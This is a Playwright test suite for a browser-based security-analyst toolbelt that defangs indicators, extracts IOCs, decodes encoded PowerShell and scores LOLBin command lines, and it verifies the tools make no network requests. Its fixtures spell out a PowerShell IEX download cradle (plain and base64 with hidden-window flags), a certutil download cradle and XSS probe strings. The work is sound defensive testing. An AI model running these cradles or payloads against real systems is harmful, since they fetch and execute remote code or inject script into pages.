// toolbelt.spec.js — the toolbelt is the one place an analyst pastes raw,
// unsanitised evidence (a phishing body, a real command line). Its contract is
// that the text never leaves the browser, so the network assertion at the
// bottom of this file is the most important one in the suite.
const { test, expect } = require("@playwright/test");

// A real -EncodedCommand payload: UTF-16LE bytes, base64'd, built here so the
// fixture is generated rather than copied from a sample that could drift.
const PS_TEXT = "IEX (New-Object Net.WebClient).DownloadString('http://x/a')";
const PS_B64 = btoa(String.fromCharCode(
  ...[...PS_TEXT].flatMap(c => [c.charCodeAt(0), 0])));

async function ready(page) {
  await page.goto("/index.html");
  await page.waitForFunction(() => document.querySelectorAll("#feedRows .row").length > 0);
  await page.locator("#toolbelt").scrollIntoViewIfNeeded();
}

test.describe("analyst toolbelt", () => {
  test.beforeEach(async ({ page }) => { await ready(page); });

  test("defang round-trips exactly through refang", async ({ page }) => {
    const original = "http://evil-updates.example.com/payload.exe 10.14.88.2 user@corp.example.com";
    await page.fill("#defangIn", original);
    await page.click("#defangBtn");                       // button starts in DEFANG mode
    const defanged = (await page.locator("#defangOut").innerText()).trim();

    expect(defanged).not.toBe(original);
    expect(defanged).toContain("hxxp[://]");
    expect(defanged).toContain("10.14.88[.]2");
    expect(defanged).toContain("[@]");
    expect(defanged, "defanged output must not be clickable").not.toMatch(/https?:\/\//);

    await expect(page.locator("#defangBtn")).toHaveText("REFANG");
    await page.fill("#defangIn", defanged);
    await page.click("#defangBtn");                       // now in REFANG mode
    expect((await page.locator("#defangOut").innerText()).trim()).toBe(original);
  });

  test("a UTF-16LE -enc payload decodes and parses to HIGH risk", async ({ page }) => {
    await page.fill("#b64In", PS_B64);
    await page.click("#b64Btn");
    const b64out = await page.locator("#b64Out").innerText();
    expect(b64out).toContain("Encoding: UTF-16LE");
    expect(b64out).toContain(PS_TEXT);

    await page.fill("#psIn", `powershell.exe -nop -w hidden -enc ${PS_B64}`);
    await page.click("#psBtn");
    const ps = await page.locator("#psOut").innerText();

    expect(ps).toContain("Binary: powershell");
    expect(ps).toContain("-EncodedCommand");
    expect(ps).toContain(PS_TEXT);                        // decoded, not just flagged
    expect(ps).toContain("HIGH");
    expect(ps).toContain("Overall risk: HIGH");
    expect(ps).toMatch(/MITRE: .*T1059\.001/);
    expect(ps, "-w hidden is the most common evasion flag and must score")
      .toMatch(/T1564/);
  });

  test("certutil download cradle is HIGH with a MITRE technique", async ({ page }) => {
    await page.fill("#lolbinIn", "certutil.exe -urlcache -split -f http://x/a");
    await page.click("#lolbinBtn");
    const out = await page.locator("#lolbinOut").innerText();
    expect(out).toContain("Binary: certutil");
    expect(out).toContain("Risk: HIGH");
    expect(out).toMatch(/MITRE: T\d{4}(\.\d{3})?/);
    expect(out).toContain("-urlcache");
    expect(out).toContain("-split");

    // an unknown binary must say so plainly instead of implying a clean verdict
    await page.fill("#lolbinIn", "totally-not-a-lolbin.exe /x");
    await page.click("#lolbinBtn");
    const miss = await page.locator("#lolbinOut").innerText();
    expect(miss).toContain("not in the LOLBin database");
    expect(miss).toContain("That is not a verdict");
  });

  test("'Lookup all' feeds the extracted IOCs into the bulk table", async ({ page }) => {
    await expect(page.locator("#extractLookup")).toBeDisabled();
    await page.fill("#extractIn",
      "Sender 8.8.8.8 fetched http://bad-host.example.com/a.bin then beaconed to " +
      "1.2.3.4; hash d41d8cd98f00b204e9800998ecf8427e; contact ops@example.com");
    await page.click("#extractBtn");

    const out = await page.locator("#extractOut").innerText();
    expect(out).toMatch(/^\d+ indicator\(s\) found/);
    expect(out).toContain("8.8.8.8");
    expect(out).toContain("d41d8cd98f00b204e9800998ecf8427e");
    const claimed = Number(out.match(/^(\d+) indicator/)[1]);
    expect(claimed).toBeGreaterThanOrEqual(4);

    await expect(page.locator("#extractLookup")).toBeEnabled();
    await page.click("#extractLookup");

    await expect(page.locator("#rail .rail-h")).toContainText("Bulk lookup", { timeout: 8000 });
    const rows = page.locator("#rail .ev .ev-row");
    expect(await rows.count()).toBeGreaterThanOrEqual(4);
    // rail labels are text-transform:uppercase — read the underlying text
    const text = await page.locator("#rail").evaluate(el => el.textContent);
    expect(text).toContain("8.8.8.8");
    expect(text).toContain("ops@example.com");
    expect(text).toContain("d41d8cd98f00b204e9800998ecf8427e");
    await expect(page.locator("#rail [data-bulk=csv]")).toBeVisible();
  });

  test("the toolbelt makes ZERO network requests — it never phones home", async ({ page }) => {
    // Warm the page first (fonts, CDN, data) so the recording window contains
    // only requests the toolbelt itself is responsible for.
    const warm = async (id, btn, v) => { await page.fill(id, v); await page.click(btn); };
    await warm("#defangIn", "#defangBtn", "warmup 1.1.1.1");
    await warm("#extractIn", "#extractBtn", "warmup 1.1.1.1 http://a.example.com/b");
    await warm("#b64In", "#b64Btn", "d2FybXVw");
    await warm("#psIn", "#psBtn", "powershell.exe -nop");
    await warm("#lolbinIn", "#lolbinBtn", "certutil.exe -decode a b");
    // NOTE: not waitForLoadState("networkidle") — the unpublished data/brief.json
    // 404 leaves one request permanently un-settled, so the page never reports
    // idle. A settle window after the warm-up pass is what makes the
    // zero-request assertion below meaningful.
    await page.waitForTimeout(2000);

    const seen = [];
    page.on("request", r => seen.push(`${r.method()} ${r.url()}`));

    const SECRET = "supersecret-analyst-paste-9f3a";
    await page.fill("#defangIn", `http://${SECRET}.example.com/x 10.0.0.9`);
    await page.click("#defangBtn");
    await page.click("#defangBtn");
    await page.fill("#extractIn", `${SECRET} 8.8.8.8 http://drop.example.com/${SECRET} CVE-2024-3400`);
    await page.click("#extractBtn");
    await page.fill("#b64In", PS_B64);
    await page.click("#b64Btn");
    await page.fill("#psIn", `powershell.exe -nop -w hidden -enc ${PS_B64}`);
    await page.click("#psBtn");
    await page.fill("#lolbinIn", `certutil.exe -urlcache -split -f http://${SECRET}/a`);
    await page.click("#lolbinBtn");
    await page.waitForTimeout(1200);

    expect(seen, `toolbelt issued network requests:\n${seen.join("\n")}`).toEqual([]);
    expect(seen.join(" ")).not.toContain(SECRET);
  });

  test("toolbelt output is text, never live DOM", async ({ page }) => {
    // outputs are written with textContent; prove markup in the input stays inert
    await page.fill("#defangIn", "<img src=x onerror=window.__beltPwned=1> 1.2.3.4");
    await page.click("#defangBtn");
    await page.fill("#extractIn", "<script>window.__beltPwned2=1</script> 1.2.3.4");
    await page.click("#extractBtn");
    await page.fill("#lolbinIn", "<b>certutil.exe</b> -urlcache");
    await page.click("#lolbinBtn");

    await expect(page.locator("#defangOut img, #extractOut script, #lolbinOut b")).toHaveCount(0);
    expect(await page.evaluate(() =>
      [typeof window.__beltPwned, typeof window.__beltPwned2])).toEqual(["undefined", "undefined"]);
    expect(await page.locator("#defangOut").innerText()).toContain("<img src=x");
  });
});
